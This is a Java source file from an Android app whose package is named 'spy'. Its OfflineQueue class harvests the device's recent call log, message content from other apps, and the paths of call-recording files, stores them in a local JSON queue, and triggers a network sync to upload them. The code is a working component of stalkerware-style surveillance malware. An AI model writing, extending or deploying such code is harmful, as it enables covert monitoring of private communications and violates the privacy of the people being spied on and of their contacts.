package com.gauravhanna.spy;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.provider.CallLog;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.File;
import java.io.FileOutputStream;
import java.io.FileInputStream;
import java.util.ArrayList;
import java.util.List;

public class OfflineQueue {
    private static final String QUEUE_FILE = "offline_queue.json";
    private static Object lock = new Object();

    // CallLogEntry inner class to hold call data
    private static class CallLogEntry {
        String contactName;
        String phoneNumber;
        int callType;
        int duration;
        long timestamp;

        CallLogEntry(String contactName, String phoneNumber, int callType, int duration, long timestamp) {
            this.contactName = contactName;
            this.phoneNumber = phoneNumber;
            this.callType = callType;
            this.duration = duration;
            this.timestamp = timestamp;
        }
    }

    // Get call logs from content resolver
    private static List<CallLogEntry> getCallLogs(ContentResolver contentResolver) {
        List<CallLogEntry> calls = new ArrayList<>();
        String[] projection = {
            CallLog.Calls.CACHED_NAME,
            CallLog.Calls.NUMBER,
            CallLog.Calls.TYPE,
            CallLog.Calls.DURATION,
            CallLog.Calls.DATE
        };
        
        try (Cursor cursor = contentResolver.query(
                CallLog.Calls.CONTENT_URI,
                projection,
                null,
                null,
                CallLog.Calls.DATE + " DESC LIMIT 100")) { // Get last 100 calls
            
            if (cursor != null) {
                int nameColumn = cursor.getColumnIndex(CallLog.Calls.CACHED_NAME);
                int numberColumn = cursor.getColumnIndex(CallLog.Calls.NUMBER);
                int typeColumn = cursor.getColumnIndex(CallLog.Calls.TYPE);
                int durationColumn = cursor.getColumnIndex(CallLog.Calls.DURATION);
                int dateColumn = cursor.getColumnIndex(CallLog.Calls.DATE);
                
                while (cursor.moveToNext()) {
                    String name = cursor.getString(nameColumn);
                    String number = cursor.getString(numberColumn);
                    int type = cursor.getInt(typeColumn);
                    int duration = cursor.getInt(durationColumn);
                    long timestamp = cursor.getLong(dateColumn);
                    
                    calls.add(new CallLogEntry(
                        name != null ? name : "Unknown",
                        number != null ? number : "",
                        type,
                        duration,
                        timestamp
                    ));
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        
        return calls;
    }

    // Convert call type to string
    private static String callTypeString(int callType) {
        switch (callType) {
            case CallLog.Calls.INCOMING_TYPE:
                return "INCOMING";
            case CallLog.Calls.OUTGOING_TYPE:
                return "OUTGOING";
            case CallLog.Calls.MISSED_TYPE:
                return "MISSED";
            default:
                return "UNKNOWN";
        }
    }

    // Collect and send calls - merged method
    public static void collectAndSendCalls(Context context) {
        List<CallLogEntry> calls = getCallLogs(context.getContentResolver());
        for (CallLogEntry call : calls) {
            addCallLog(context, call.contactName, call.phoneNumber, 
                      callTypeString(call.callType), call.duration, call.timestamp);
        }
    }

    public static void addCallLog(Context context, String contact, String number, String type, int duration, long timestamp) {
        JSONObject obj = new JSONObject();
        try {
            obj.put("type", "call");
            obj.put("contact", contact);
            obj.put("number", number);
            obj.put("callType", type);
            obj.put("duration", duration);
            obj.put("timestamp", timestamp);
            addToQueue(context, obj);
        } catch (Exception e) { e.printStackTrace(); }
    }

    public static void addMessage(Context context, String app, String contact, String message, long timestamp, boolean incoming) {
        JSONObject obj = new JSONObject();
        try {
            obj.put("type", "message");
            obj.put("app", app);
            obj.put("contact", contact);
            obj.put("message", message);
            obj.put("timestamp", timestamp);
            obj.put("isIncoming", incoming);
            addToQueue(context, obj);
        } catch (Exception e) { e.printStackTrace(); }
    }

    public static void addRecording(Context context, String filePath, String phoneNumber, long timestamp) {
        // For recording, we'll store the file path and later convert to base64
        JSONObject obj = new JSONObject();
        try {
            obj.put("type", "recording");
            obj.put("filePath", filePath);
            obj.put("phoneNumber", phoneNumber);
            obj.put("timestamp", timestamp);
            addToQueue(context, obj);
        } catch (Exception e) { e.printStackTrace(); }
    }

    private static void addToQueue(Context context, JSONObject obj) {
        synchronized (lock) {
            try {
                File file = new File(context.getFilesDir(), QUEUE_FILE);
                JSONArray queue = new JSONArray();
                if (file.exists()) {
                    try (FileInputStream fis = new FileInputStream(file)) {
                        byte[] data = new byte[(int) file.length()];
                        fis.read(data);
                        String json = new String(data);
                        queue = new JSONArray(json);
                    }
                }
                queue.put(obj);
                try (FileOutputStream fos = new FileOutputStream(file)) {
                    fos.write(queue.toString().getBytes());
                }
                // Trigger sync if online
                NetworkHelper.triggerSync(context);
            } catch (Exception e) { e.printStackTrace(); }
        }
    }

    public static List<JSONObject> getAllPending(Context context) {
        List<JSONObject> list = new ArrayList<>();
        synchronized (lock) {
            try {
                File file = new File(context.getFilesDir(), QUEUE_FILE);
                if (file.exists()) {
                    try (FileInputStream fis = new FileInputStream(file)) {
                        byte[] data = new byte[(int) file.length()];
                        fis.read(data);
                        String json = new String(data);
                        JSONArray queue = new JSONArray(json);
                        for (int i = 0; i < queue.length(); i++) {
                            list.add(queue.getJSONObject(i));
                        }
                    }
                }
            } catch (Exception e) { e.printStackTrace(); }
        }
        return list;
    }

    public static void clearQueue(Context context) {
        synchronized (lock) {
            File file = new File(context.getFilesDir(), QUEUE_FILE);
            if (file.exists()) file.delete();
        }
    }
}